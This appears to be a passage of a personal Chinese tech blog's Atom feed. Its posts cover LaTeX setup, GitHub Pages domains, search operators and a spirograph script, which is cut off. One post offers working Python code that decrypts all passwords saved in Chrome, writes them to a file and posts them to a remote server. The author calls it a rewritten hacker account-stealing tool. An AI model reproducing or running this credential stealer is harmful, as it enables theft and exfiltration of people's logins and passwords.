    <content type="html"><![CDATA[<p>LaTeX是一个专门的排版软件，很多科学出版社都是用这个软件。</p><a id="more"></a><h1 id="一、安装Texlive"><a href="#一、安装Texlive" class="headerlink" title="一、安装Texlive"></a>一、安装Texlive</h1><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h2><p><a href="https://www.latex-project.org/" target="_blank" rel="noopener">官网下载</a></p><p><img src="https://s2.ax1x.com/2019/11/10/MKR9Ig.md.png" alt="官网" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MKRpdS.md.png" alt="Get" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2OxI.md.png" alt="下载" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2qGd.md.png" alt="下载" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2xqf.md.png" alt="下载" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2vsP.md.png" alt="下载" border="0"></p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><p>解压后点击运行程序</p><p><img src="https://s2.ax1x.com/2019/11/10/MKRwJH.md.png" alt="安装" border="0"></p><p>在线安装三个多G，有点慢，可以做点别的事情</p><p><img src="https://s2.ax1x.com/2019/11/10/MKR0Wd.md.png" alt="安装" border="0"></p><h1 id="二、安装texstudio"><a href="#二、安装texstudio" class="headerlink" title="二、安装texstudio"></a>二、安装texstudio</h1><h2 id="1-下载-1"><a href="#1-下载-1" class="headerlink" title="1.下载"></a>1.下载</h2><p><a href="http://texstudio.sourceforge.net/" target="_blank" rel="noopener">官网下载</a></p><p>直接download，然后安装</p><h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h2><p>修改语言：</p><p>Options—-Configure TexStudio…—-General—-Language—-zh_CN</p><p>命令里正常的，如果不一样需要手动修改：</p><p><img src="https://s2.ax1x.com/2019/11/10/MKRbwT.md.png" alt="参数参考" border="0"></p><h1 id="三、学习使用文档"><a href="#三、学习使用文档" class="headerlink" title="三、学习使用文档"></a>三、学习使用文档</h1><p>官方使用文档：<a href="https://www.latex-project.org/help/links/" target="_blank" rel="noopener">https://www.latex-project.org/help/links/</a></p><p>b站配套安装视频：<a href="https://www.bilibili.com/video/av40903112/" target="_blank" rel="noopener">https://www.bilibili.com/video/av40903112/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LaTeX是一个专门的排版软件，很多科学出版社都是用这个软件。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="LaTex安装使用" scheme="http://yoursite.com/tags/LaTex%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>获取所有谷歌浏览器上保存的密码</title>
    <link href="http://yoursite.com/2019/11/09/%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2019/11/09/获取所有谷歌浏览器上保存的密码/</id>
    <published>2019-11-09T05:42:28.000Z</published>
    <updated>2019-11-09T05:52:25.739Z</updated>
    
    <content type="html"><![CDATA[<p>使用谷歌浏览器都知道，非常人性化的一方面就是记住我们在某些网站登录的账号和密码，并且自动填写，那么我们将利用py获取谷歌浏览器上保存的所有账号和密码，对于此程序原身为黑客盗号软件，经过我的改写，它将不会这么邪恶。</p><a id="more"></a><h1 id="简易版代码"><a href="#简易版代码" class="headerlink" title="简易版代码"></a>简易版代码</h1><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># @Author  : 王荣胜</span></span><br><span class="line"><span class="hljs-comment"># @Blog : https://sqdxwz.top</span></span><br><span class="line"><span class="hljs-comment"># @Date    : 2019/11/09 10:20</span></span><br><span class="line"><span class="hljs-comment"># Software : IDLE</span></span><br><span class="line"><span class="hljs-comment"># version：Python 3.6.6</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> shutil</span><br><span class="line"><span class="hljs-keyword">import</span> sqlite3</span><br><span class="line"><span class="hljs-keyword">import</span> win32crypt</span><br><span class="line"></span><br><span class="line">db_file_path = os.path.join(os.environ[<span class="hljs-string">'LOCALAPPDATA'</span>], <span class="hljs-string">r'Google\Chrome\User Data\Default\Login Data'</span>)</span><br><span class="line"></span><br><span class="line">tmp_file = os.path.join(os.environ[<span class="hljs-string">'LOCALAPPDATA'</span>], <span class="hljs-string">'sqlite_file'</span>)</span><br><span class="line">print(tmp_file)</span><br><span class="line"><span class="hljs-keyword">if</span> os.path.exists(tmp_file):</span><br><span class="line">    os.remove(tmp_file)</span><br><span class="line">shutil.copyfile(db_file_path, tmp_file)</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(tmp_file)</span><br><span class="line"><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> conn.execute(<span class="hljs-string">'select signon_realm,username_value,password_value from logins'</span>):</span><br><span class="line">    ret = win32crypt.CryptUnprotectData(row[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)</span><br><span class="line">    print(<span class="hljs-string">'网站：%-50s，用户名：%-20s，密码：%s'</span> % (row[<span class="hljs-number">0</span>][:<span class="hljs-number">50</span>], row[<span class="hljs-number">1</span>], ret[<span class="hljs-number">1</span>].decode(<span class="hljs-string">'gbk'</span>)))</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">os.remove(tmp_file)</span><br></pre></td></tr></table></figure><h1 id="完整进阶版代码"><a href="#完整进阶版代码" class="headerlink" title="完整进阶版代码"></a>完整进阶版代码</h1><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># @Author  : 王荣胜</span></span><br><span class="line"><span class="hljs-comment"># @Blog : https://sqdxwz.top</span></span><br><span class="line"><span class="hljs-comment"># @Date    : 2019/11/09 10:20</span></span><br><span class="line"><span class="hljs-comment"># Software : IDLE</span></span><br><span class="line"><span class="hljs-comment"># version：Python 3.6.6</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> shutil</span><br><span class="line"><span class="hljs-keyword">import</span> sqlite3</span><br><span class="line"><span class="hljs-keyword">import</span> win32crypt</span><br><span class="line"><span class="hljs-keyword">import</span> json</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH = os.environ[<span class="hljs-string">"LOCALAPPDATA"</span>]</span><br><span class="line">DB_PATH = <span class="hljs-string">r'Google\Chrome\User Data\Default\Login Data'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChromePassword</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self.passwordsList = []</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_chrome_db</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)</span><br><span class="line">        _tmp_file = os.path.join(os.environ[<span class="hljs-string">'LOCALAPPDATA'</span>], <span class="hljs-string">'sqlite_file'</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> os.path.exists(_tmp_file):</span><br><span class="line">            os.remove(_tmp_file)</span><br><span class="line">        shutil.copyfile(_full_path, _tmp_file)</span><br><span class="line">        self.show_passwords(_tmp_file)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_passwords</span><span class="hljs-params">(self, db_file)</span>:</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="hljs-string">'''select signon_realm,username_value,password_value from logins'''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)</span><br><span class="line">            <span class="hljs-comment"># 密码解析后得到的是字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="hljs-string">'url: %-40s username: %-20s password: %s\n'</span> % \</span><br><span class="line">                    (row[<span class="hljs-number">0</span>][:<span class="hljs-number">50</span>], row[<span class="hljs-number">1</span>], ret[<span class="hljs-number">1</span>].decode())</span><br><span class="line">            self.passwordsList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_passwords</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">with</span> open(<span class="hljs-string">'password.txt'</span>, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordsList)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transfer_passwords</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            <span class="hljs-comment"># 此处填写远端Flask对应的IP:PORT</span></span><br><span class="line">            requests.post(<span class="hljs-string">'http://192.168.1.102:9999/index'</span>,</span><br><span class="line">                          data=json.dumps(self.passwordsList))</span><br><span class="line">        <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br><span class="line">    Main.transfer_passwords()</span><br></pre></td></tr></table></figure><h1 id="运行显示"><a href="#运行显示" class="headerlink" title="运行显示"></a>运行显示</h1><img src="https://s2.ax1x.com/2019/11/09/MexQwd.png" alt="MexQwd.png" border="0">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用谷歌浏览器都知道，非常人性化的一方面就是记住我们在某些网站登录的账号和密码，并且自动填写，那么我们将利用py获取谷歌浏览器上保存的所有账号和密码，对于此程序原身为黑客盗号软件，经过我的改写，它将不会这么邪恶。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="获取谷歌密码" scheme="http://yoursite.com/tags/%E8%8E%B7%E5%8F%96%E8%B0%B7%E6%AD%8C%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Github Pages设置自定义域名</title>
    <link href="http://yoursite.com/2019/11/09/Github-Pages%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/"/>
    <id>http://yoursite.com/2019/11/09/Github-Pages设置自定义域名/</id>
    <published>2019-11-09T04:24:51.000Z</published>
    <updated>2019-11-09T06:17:39.170Z</updated>
    
    <content type="html"><![CDATA[<p>今日想来，我手下也有6个域名了，不如给我的Hexo+Github建立的博客换上一个域名吧。</p><p>新域名在这：<a href="https://sqdxwz.top" target="_blank" rel="noopener">https://sqdxwz.top</a></p><a id="more"></a><p>把自定义域名的步骤进行记录-<strong>三步设置自定义域名</strong>。</p><h2 id="1-获取博客的ip地址"><a href="#1-获取博客的ip地址" class="headerlink" title="1.获取博客的ip地址"></a>1.获取博客的ip地址</h2><p>首先是用ping命令找到存放你的github pages的主机的IP地址，在终端里面用命令ping xxx.github.io便可完成，下图中红框内的就是我们要找的IP地址：</p><p><a href="https://imgchr.com/i/MeTGK1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTGK1.md.png" alt="MeTGK1.png" border="0"></a></p><h2 id="2-域名解析"><a href="#2-域名解析" class="headerlink" title="2.域名解析"></a>2.域名解析</h2><p>在购买域名的提供商为域名添加解析。我是在阿里云买的域名，因此我以阿里云的为例。在域名控制台选择想要绑定的域名，并点击解析：</p><p><a href="https://imgchr.com/i/MeTwPe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTwPe.md.png" alt="MeTwPe.png" border="0"></a></p><p>然后添加如下两条记录：</p><p><a href="https://imgchr.com/i/MeTyrt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTyrt.md.png" alt="MeTyrt.png" border="0"></a></p><h2 id="3-Github仓库设置"><a href="#3-Github仓库设置" class="headerlink" title="3.Github仓库设置"></a>3.Github仓库设置</h2><p>在Github中，找到托管博客的xxx.github.io项目：</p><p><a href="https://imgchr.com/i/MeTfPg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTfPg.md.png" alt="MeTfPg.png" border="0"></a></p><p>进入到设置页面，并滑动到下方，找到Github Pages这一栏，在Custom Domain填上刚刚添加解析的域名并保存：</p><p><a href="https://imgchr.com/i/MeT7q0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeT7q0.md.png" alt="MeT7q0.png" border="0"></a></p><p>到这儿就已经完成了，等待10分钟后就可以使用自定义的域名访问github pages所提供的页面了。</p><h2 id="4-后续"><a href="#4-后续" class="headerlink" title="4.后续"></a>4.后续</h2><p>如果你不想每次在<strong>hexo g -d</strong> 后都重新设置下域名。</p><p>你可以在本地的<strong>source文件</strong> 下添加一个<strong>CNAME文件</strong> ，里面填写自己的自定义域名就好了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今日想来，我手下也有6个域名了，不如给我的Hexo+Github建立的博客换上一个域名吧。&lt;/p&gt;
&lt;p&gt;新域名在这：&lt;a href=&quot;https://sqdxwz.top&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://sqdxwz.top&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="Github Pages" scheme="http://yoursite.com/tags/Github-Pages/"/>
    
  </entry>
  
  <entry>
    <title>搜索引擎之高级搜索</title>
    <link href="http://yoursite.com/2019/11/09/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/"/>
    <id>http://yoursite.com/2019/11/09/搜索引擎之高级搜索/</id>
    <published>2019-11-09T03:27:25.000Z</published>
    <updated>2019-11-09T03:41:43.652Z</updated>
    
    <content type="html"><![CDATA[<p>普通搜索可以满足基本的需求，特殊搜索一直都是网站SEO的必修课。</p><a id="more"></a><p>介绍下搜索方法的高级搜索方法，之前在某平台看到过，没太在意，如今再次被人提起，就整理下。</p><h2 id="1-site："><a href="#1-site：" class="headerlink" title="1.site："></a>1.site：</h2><p>site是最常用的搜索指令，它是用来搜索某个域名下的所有文件(注意：文件须是搜索引擎收录的文件)。</p><h2 id="2-双引号"><a href="#2-双引号" class="headerlink" title="2.双引号"></a>2.双引号</h2><p>把搜索词放在双引号，代表<strong>完全匹配搜索</strong>。搜索结果返回的页面包含双引号中出现的所有词，连顺序也必须完全匹配。百度和谷歌都支持这个指令。</p><h2 id="3-减号"><a href="#3-减号" class="headerlink" title="3.减号"></a>3.减号</h2><p>减号(-)代表搜索不包含减号后面的词的页面。</p><p><strong>注意</strong>：减号前面有空格而后面没有空格，紧跟着需要排除的词。百度和谷歌都支持这个指令。</p><h2 id="4-星号"><a href="#4-星号" class="headerlink" title="4.星号"></a>4.星号</h2><p>星号(*)在计算机里的术语叫通配符，就是匹配全部的意思。百度不支持*号搜索指令。比如在Google中搜索”郭*纲”，其中*号代表了任何文字。返回的结果不仅包含了郭德纲，还包含了其他。</p><h2 id="5-inulr："><a href="#5-inulr：" class="headerlink" title="5.inulr："></a>5.inulr：</h2><p>inurl:指令用于搜索查询词出现在URL(链接)中的页面。</p><h2 id="6-inanchor："><a href="#6-inanchor：" class="headerlink" title="6.inanchor："></a>6.inanchor：</h2><p>这个指令返回的结果是导入链接锚文字中包含搜索词的页面，百度不支持该指令。这个指令可以帮助SEOer去研究竞争对手页面有哪些外链，可以找到很多行业外链资源平台。</p><h2 id="7-intitle："><a href="#7-intitle：" class="headerlink" title="7.intitle："></a>7.intitle：</h2><p>该指令返回的是页面title中包含关键词的页面。百度和Google都支持该指令。SEOer都会把关键词放进Title中，因此使用intitle指令找到的文件才是更准确的竞争页面。而没有出现在title中的大部分是并没有针对关键词进行优化，也不是有力的竞争对手。</p><h2 id="8-alltitle："><a href="#8-alltitle：" class="headerlink" title="8.alltitle："></a>8.alltitle：</h2><p>该标签返回的结果是页面标题中包含多组关键词的文件，如：alltitle:SEO搜索引擎优化就相当于intitle:SEO intitle:搜索引擎优化返回的是标题中既包含”SEO”也包含”搜索引擎优化”的页面。</p><h2 id="9-allinurl："><a href="#9-allinurl：" class="headerlink" title="9.allinurl："></a>9.allinurl：</h2><p>与alltitle类似。allurl:SEO搜索引擎优化就相当于iknurl:SEO inurl:搜索引擎优化。</p><h2 id="10-filetype："><a href="#10-filetype：" class="headerlink" title="10.filetype："></a>10.filetype：</h2><p>该指令用于特定的文件格式。百度和Google都支持该指令。</p><h2 id="11-link："><a href="#11-link：" class="headerlink" title="11.link："></a>11.link：</h2><p>link是以前SEO常用的指令，用来搜索某个url的反向链接，既包括内部链接，也包括外部链接。但是现在Google对这个指令只返回其索引库中的一部分，而且是近乎随机的一部分，所以用这个指令查反链几乎没有用。百度则不支持该指令。</p><h2 id="12-linkdomain："><a href="#12-linkdomain：" class="headerlink" title="12.linkdomain："></a>12.linkdomain：</h2><p>该指令曾经是SEOer必用的外链查询工具，随着雅虎放弃自己的搜索技术，这个指令已经作废。这个指令只适用于雅虎。</p><h2 id="13-related："><a href="#13-related：" class="headerlink" title="13.related："></a>13.related：</h2><p>该指令只适用于Google，返回的结果是与某个网站有关联的页面。这种关联到底指的是什么，Google并没有明确说明，一般认为指的是有共同外部链接的网站。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;普通搜索可以满足基本的需求，特殊搜索一直都是网站SEO的必修课。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="高级搜索" scheme="http://yoursite.com/tags/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>Python实现​旋转描记器</title>
    <link href="http://yoursite.com/2019/11/09/Python%E5%AE%9E%E7%8E%B0%E2%80%8B%E6%97%8B%E8%BD%AC%E6%8F%8F%E8%AE%B0%E5%99%A8/"/>
    <id>http://yoursite.com/2019/11/09/Python实现​旋转描记器/</id>
    <published>2019-11-09T03:00:43.000Z</published>
    <updated>2019-11-09T03:08:51.266Z</updated>
    
    <content type="html"><![CDATA[<p>旋转描记器是一种几何绘图玩具，可产生各种技术上称为下摆线和下摆线的数学轮盘曲线。它是由英国工程师Denys Fisher开发的，于1965年首次出售。该名称是1998年Hasbro 公司（Hasbro Inc.）的注册商标，此前该公司 收购了Denys Fisher公司。Spirograph品牌于2013年由Kahootz Toys在全球范围内重新推出其原始产品配置，旋描仪可用于绘制各种分形。</p><a id="more"></a><p>对于数学部分，您可以参考Wiki：<a href="https://en.wikipedia.org/wiki/Spirograph#Mathematical_basis" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Spirograph#Mathematical_basis</a></p><p>代码实现：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#importing the required libraries </span></span><br><span class="line"><span class="hljs-keyword">import</span> random, argparse </span><br><span class="line"><span class="hljs-keyword">import</span> math </span><br><span class="line"><span class="hljs-keyword">import</span> turtle </span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image </span><br><span class="line"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime </span><br><span class="line"><span class="hljs-keyword">from</span> fractions <span class="hljs-keyword">import</span> gcd </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># A class that draws a spirograph </span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Spiro</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># constructor </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, xc, yc, col, R, r, l)</span>:</span> </span><br><span class="line">  </span><br><span class="line">        <span class="hljs-comment"># create own turtle </span></span><br><span class="line">        self.t = turtle.Turtle() </span><br><span class="line">        <span class="hljs-comment"># set cursor shape </span></span><br><span class="line">        self.t.shape(<span class="hljs-string">'turtle'</span>) </span><br><span class="line">        <span class="hljs-comment"># set step in degrees </span></span><br><span class="line">        self.step = <span class="hljs-number">5</span></span><br><span class="line">        <span class="hljs-comment"># set drawing complete flag </span></span><br><span class="line">        self.drawingComplete = <span class="hljs-literal">False</span></span><br><span class="line">  </span><br><span class="line">        <span class="hljs-comment"># set parameters </span></span><br><span class="line">        self.setparams(xc, yc, col, R, r, l) </span><br><span class="line">  </span><br><span class="line">        <span class="hljs-comment"># initiatize drawing </span></span><br><span class="line">        self.restart() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set parameters </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setparams</span><span class="hljs-params">(self, xc, yc, col, R, r, l)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># spirograph parameters </span></span><br><span class="line">        self.xc = xc </span><br><span class="line">        self.yc = yc </span><br><span class="line">        self.R = int(R) </span><br><span class="line">        self.r = int(r) 